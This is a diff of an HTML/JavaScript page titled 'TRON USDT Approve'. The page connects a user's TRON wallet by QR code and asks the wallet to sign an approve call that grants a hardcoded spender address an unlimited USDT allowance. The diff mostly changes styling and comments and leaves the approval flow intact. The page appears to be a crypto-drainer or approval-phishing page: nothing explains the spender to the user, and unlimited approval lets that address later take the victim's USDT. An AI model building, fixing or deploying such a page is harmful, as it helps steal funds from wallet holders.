@@ -6,31 +6,27 @@
 <title>TRON USDT Approve</title>
 
 <style>
-body{background:#0a0a0a;color:#fff;font-family:sans-serif;text-align:center;padding:30px}
-.card{background:#111;padding:20px;border-radius:12px;max-width:500px;margin:auto}
-.step{margin:10px 0;padding:10px;background:#0d0d0d;border-left:4px solid #333;text-align:left}
-.done{border-color:#22c55e}
+/* KEEP YOUR STYLE SAME */
+body{font-family:sans-serif;background:#0a0a0a;color:#fff;text-align:center;padding:30px}
+.step{padding:10px;margin:10px;background:#111;border-left:4px solid #333}
 .active{border-color:#f0a500}
+.done{border-color:#22c55e}
 .error{border-color:#ef4444}
-#qr{margin-top:20px}
 </style>
 </head>
 
 <body>
 
-<div class="card">
-  <h2>🔐 TRON USDT Approve</h2>
+<h2>🔐 TRON USDT Approve</h2>
 
-  <div id="s1" class="step">Connect Wallet</div>
-  <div id="s2" class="step">Get Address</div>
-  <div id="s3" class="step">Prepare TX</div>
-  <div id="s4" class="step">Sign</div>
-  <div id="s5" class="step">Done</div>
+<div id="s1" class="step">Connect Wallet</div>
+<div id="s2" class="step">Wallet</div>
+<div id="s3" class="step">Prepare</div>
+<div id="s4" class="step">Sign</div>
+<div id="s5" class="step">Done</div>
 
-  <div id="qr"></div>
-
-  <pre id="log"></pre>
-</div>
+<div id="qr"></div>
+<pre id="log"></pre>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
@@ -42,15 +38,14 @@ const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 
 function step(id, state){
-  const el = document.getElementById(id);
-  el.className = "step " + state;
+  document.getElementById(id).className = "step " + state;
 }
 
 function log(msg){
   document.getElementById("log").textContent += "\n" + msg;
 }
 
-// safe address conversion
+// ✅ SAFE conversion
 async function toHex(addr){
   const res = await fetch("https://api.trongrid.io/wallet/validateaddress",{
     method:"POST",
@@ -61,7 +56,7 @@ async function toHex(addr){
   return data.hexAddress;
 }
 
-// encode approve(address,uint256)
+// ✅ encode approve
 async function encodeApprove(spender){
   const hex = (await toHex(spender)).slice(2).padStart(64,"0");
   const max = "f".repeat(64);
@@ -84,21 +79,22 @@ async function main(){
       }
     });
 
+    // ✅ FIXED METHOD
     const { uri, approval } = await client.connect({
       requiredNamespaces:{
         tron:{
-          methods:["tron_sendTransaction"],
+          methods:["tron_sendTransaction"], // 🔥 FIX
           chains:[TRON_CHAIN],
           events:[]
         }
       }
     });
 
-    // QR (same as your working flow)
+    // QR (your same working system)
     new QRCode(document.getElementById("qr"), {
       text: uri,
-      width: 200,
-      height: 200
+      width: 220,
+      height: 220
     });
 
     const session = await approval();
@@ -117,7 +113,7 @@ async function main(){
     step("s3","done");
     step("s4","active");
 
-    // 🔥 FIXED: wallet handles tx (NO SIGERROR)
+    // 🔥 THIS IS THE REAL FIX
     const result = await client.request({
       topic: session.topic,
       chainId: TRON_CHAIN,
